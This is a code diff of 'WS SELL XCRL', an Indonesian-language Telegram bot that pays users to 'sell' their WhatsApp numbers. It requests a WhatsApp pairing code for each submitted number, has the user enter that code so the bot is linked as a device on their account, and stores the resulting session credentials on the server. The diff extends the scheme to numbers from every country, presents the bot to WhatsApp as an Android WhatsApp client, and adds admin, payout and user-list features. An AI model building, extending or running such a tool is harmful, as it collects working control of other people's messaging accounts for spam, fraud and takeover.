@@ -1,8 +1,9 @@
 // ==============================================
 // 🤖 WS SELL XCRL • MADE IN WAGYU
+// ✅ Mendukung Semua Negara
 // ==============================================
 
-const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
 const { Bot, InlineKeyboard } = require('grammy');
 const express = require('express');
 const fs = require('fs-extra');
@@ -54,6 +55,7 @@ async function menuPengguna(ctx) {
 💰 Harga per nomor: *Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}*
 💵 Saldo kamu: *Rp${saldo.toLocaleString('id-ID')}*
 💳 Minimal WD: *Rp${PENGATURAN.MIN_WD.toLocaleString('id-ID')}*
+✅ Mendukung Semua Negara
 ${PENGATURAN.INFO_WA}`;
   const kb = new InlineKeyboard()
     .text('📤 JUAL NOMOR', 'jual_nomor').row()
@@ -63,11 +65,22 @@ ${PENGATURAN.INFO_WA}`;
   await ctx.reply(`👋 *WS SELL XCRL • MADE IN WAGYU*\n${teks}`, { reply_markup: kb, parse_mode: 'Markdown' });
 }
 
+async function menuAdmin(ctx) {
+  const kb = new InlineKeyboard()
+    .text('💰 UBAH RATE', 'ubah_rate').row()
+    .text('🏪 ATUR TOKO', 'atur_status').row()
+    .text('📞 UBAH INFO', 'ubah_info').row()
+    .text('💳 ATUR WD', 'atur_wd').row()
+    .text('👤 DAFTAR USER', 'lihat_user').row()
+    .text('📋 RIWAYAT', 'riwayat');
+  await ctx.reply(`⚙️ *PANEL ADMIN • WS SELL XCRL*\n💰 Rate: Rp${PENGATURAN.REWARD}`, { reply_markup: kb, parse_mode: 'Markdown' });
+}
+
 bot.command('start', ctx => ctx.from.id === ADMIN_ID ? menuAdmin(ctx) : menuPengguna(ctx));
 
 bot.callbackQuery('jual_nomor', ctx => {
   ctx.answerCallbackQuery();
-  ctx.reply('📤 Silakan kirim nomor WhatsApp kamu:\nContoh: *+628123456789*', { parse_mode: 'Markdown' });
+  ctx.reply('📤 Kirim nomor lengkap dengan kode negara:\nContoh: *+628123456789* / *+1234567890* / *+447911123456*', { parse_mode: 'Markdown' });
 });
 
 // PROSES UTAMA
@@ -75,17 +88,35 @@ bot.on('message:text', async ctx => {
   const uid = ctx.from.id;
   const teks = ctx.message.text.trim();
 
-  // Cek format nomor
-  if (/^\+?62\d{8,12}$/.test(teks)) {
+  // Perintah Admin
+  if (uid === ADMIN_ID) {
+    if (teks.startsWith('rate ')) {
+      const v = parseInt(teks.split(' ')[1]);
+      if (v > 0) { PENGATURAN.REWARD = v; simpan(); return ctx.reply(`✅ Rate diubah: Rp${v.toLocaleString('id-ID')}`); }
+    }
+    if (teks.startsWith('info ')) { PENGATURAN.INFO_WA = teks.slice(5); simpan(); return ctx.reply(`✅ Info diperbarui`); }
+    if (teks.startsWith('wd ')) {
+      const [_, m, ...d] = teks.split(' ');
+      if (m) { WD_METHODS[m] = d.join(' '); simpan(); return ctx.reply(`✅ ${m.toUpperCase()} disimpan`); }
+    }
+  }
+
+  // ✅ Format nomor diperluas: menerima kode negara apa saja, panjang 9-15 digit
+  if (/^\+?\d{9,15}$/.test(teks)) {
     const nomor = teks.replace('+', '');
     await ctx.reply('⏳ Sedang memproses, mohon tunggu sebentar...');
 
     try {
+      const { version } = await fetchLatestBaileysVersion();
       const { state, saveCreds } = await useMultiFileAuthState(`./auth/${uid}_${nomor}`);
       const sock = makeWASocket({
         auth: state,
+        version: version,
         printQRInTerminal: false,
-        browser: ['Chrome', 'Android', '2.3000.10.0']
+        browser: ['WhatsApp', 'Android', '2.24.10.0'],
+        syncFullHistory: false,
+        connectTimeoutMs: 60_000,
+        defaultQueryTimeoutMs: undefined
       });
 
       sock.ev.on('creds.update', saveCreds);
@@ -99,24 +130,25 @@ bot.on('message:text', async ctx => {
 
 📝 CARA VERIFIKASI:
 1. Buka aplikasi WhatsApp
-2. Masukkan nomor: *+${nomor}*
-3. Pilih opsi: *Verifikasi lewat nomor telepon*
-4. Pilih: *Gunakan kode verifikasi*
-5. Masukkan kode berikut:
+2. Masukkan nomor lengkap: *+${nomor}*
+3. Pilih: *Verifikasi lewat nomor telepon / WhatsApp*
+4. Masukkan kode berikut:
 
 🔑 *${kode}*
 
 👉 *Kirim kode ini kembali ke bot*
-✅ WA kamu tetap bisa dibuka & dipakai normal`, { parse_mode: 'Markdown' });
+✅ WA tetap bisa dibuka & dipakai normal`, { parse_mode: 'Markdown' });
           } catch (err) {
-            await ctx.reply('❌ Gagal membuat kode, coba kirim ulang nomor.');
+            console.error('Gagal buat kode:', err);
+            await ctx.reply('❌ Gagal membuat kode. Pastikan nomor lengkap dengan kode negara, lalu kirim ulang.');
             sock.end();
           }
         }
       });
 
     } catch (err) {
-      return ctx.reply('❌ Nomor tidak valid atau gagal terhubung.');
+      console.error('Error koneksi:', err);
+      return ctx.reply('❌ Nomor tidak valid, gunakan format: +[kode negara][nomor]');
     }
     return;
   }
@@ -139,8 +171,12 @@ bot.on('message:text', async ctx => {
 
 ✅ Selesai, WA tetap aman dipakai`, { parse_mode: 'Markdown' });
 
-      bot.api.sendMessage(ADMIN_ID, `📥 Masuk: +${nomor} | Rp${PENGATURAN.REWARD}`);
+      bot.api.sendMessage(ADMIN_ID, `📥 *TRANSAKSI MASUK*
+👤 User: ${uid}
+📞 Nomor: +${nomor}
+💵 Rp${PENGATURAN.REWARD}`);
     } catch (err) {
+      console.error('Salah kode:', err);
       await ctx.reply('❌ Kode salah / kadaluarsa. Ulangi jual nomor lagi.');
     }
     proses.delete(uid);
@@ -150,8 +186,30 @@ bot.on('message:text', async ctx => {
 
 // Tombol lainnya
 bot.callbackQuery('cek_saldo', ctx => { ctx.answerCallbackQuery(); const s = data.saldo[ctx.from.id]||0; ctx.reply(`💵 Saldo: Rp${s.toLocaleString('id-ID')}`); });
-bot.callbackQuery('cara_pakai', ctx => { ctx.answerCallbackQuery(); ctx.reply(`📖 Cara:\n1. Kirim nomor\n2. Dapat kode\n3. Masukkan di WA\n4. Kirim kode ke bot\n✅ Selesai`); });
+bot.callbackQuery('cara_pakai', ctx => { ctx.answerCallbackQuery(); ctx.reply(`📖 Cara Pakai:\n1. Pilih menu JUAL NOMOR\n2. Kirim nomor lengkap dengan kode negara\n3. Masukkan kode di WA\n4. Kirim kode kembali ke bot\n✅ Selesai`); });
+bot.callbackQuery('menu_wd', ctx => { ctx.answerCallbackQuery(); const s = data.saldo[ctx.from.id]||0; if (s < PENGATURAN.MIN_WD) return ctx.reply(`❌ Minimal WD: Rp${PENGATURAN.MIN_WD}`); const daftar = Object.entries(WD_METHODS).map(([m,r])=>`• ${m.toUpperCase()}: ${r}`).join('\n'); ctx.reply(`💳 Format: /wd dana 20000\n\n${daftar}`); });
+bot.callbackQuery('ubah_rate', ctx => { ctx.answerCallbackQuery(); ctx.reply('✏️ Contoh: *rate 7500*'); });
+bot.callbackQuery('atur_status', ctx => { ctx.answerCallbackQuery(); const kb = new InlineKeyboard().text('🟢 BUKA', 'set_buka').text('🔴 TUTUP', 'set_tutup'); ctx.reply('🏪 Pilih status:', { reply_markup: kb }); });
+bot.callbackQuery('set_buka', ctx => { PENGATURAN.STATUS_TOKO = '🟢 TOKO SEDANG BUKA'; simpan(); ctx.answerCallbackQuery(); ctx.reply('✅ Toko dibuka'); });
+bot.callbackQuery('set_tutup', ctx => { PENGATURAN.STATUS_TOKO = '🔴 TOKO SEDANG TUTUP'; simpan(); ctx.answerCallbackQuery(); ctx.reply('✅ Toko ditutup'); });
+bot.callbackQuery('ubah_info', ctx => { ctx.answerCallbackQuery(); ctx.reply('✏️ Contoh: *info 📞 Buka 08.00-22.00 WIB*'); });
+bot.callbackQuery('atur_wd', ctx => { ctx.answerCallbackQuery(); ctx.reply('✏️ Contoh: *wd dana 08xxxx a.n Nama*'); });
+bot.callbackQuery('lihat_user', ctx => { ctx.answerCallbackQuery(); const daftar = Object.entries(data.saldo).map(([id,s])=>`👤 ID: ${id} | Rp${s}`).join('\n')||'Belum ada'; ctx.reply(`📋 Pengguna:\n${daftar}`); });
+bot.callbackQuery('riwayat', ctx => { ctx.answerCallbackQuery(); const log = data.transaksi.slice(-10).join('\n')||'Kosong'; ctx.reply(`📜 Riwayat:\n${log}`); });
 
-bot.catch(err => console.error('❌ Error:', err));
+bot.command('wd', async ctx => {
+  const uid = ctx.from.id;
+  const args = ctx.message.text.trim().split(' ');
+  const metode = args[1]?.toLowerCase();
+  const jumlah = parseInt(args[2]);
+  if (!metode || !jumlah || jumlah < PENGATURAN.MIN_WD || !WD_METHODS[metode] || (data.saldo[uid]||0) < jumlah)
+    return ctx.reply('❌ Format salah / saldo kurang / metode tidak ada');
+  data.saldo[uid] -= jumlah; simpan();
+  ctx.reply(`✅ WD diterima: Rp${jumlah.toLocaleString('id-ID')} ke ${metode.toUpperCase()}`);
+  bot.api.sendMessage(ADMIN_ID, `📤 WD: User ${uid} | Rp${jumlah}`);
+});
+
+bot.catch(err => console.error('❌ Error bot:', err));
 bot.start({ polling: true });
 console.log('🤖 WS SELL XCRL Aktif');
+                                     
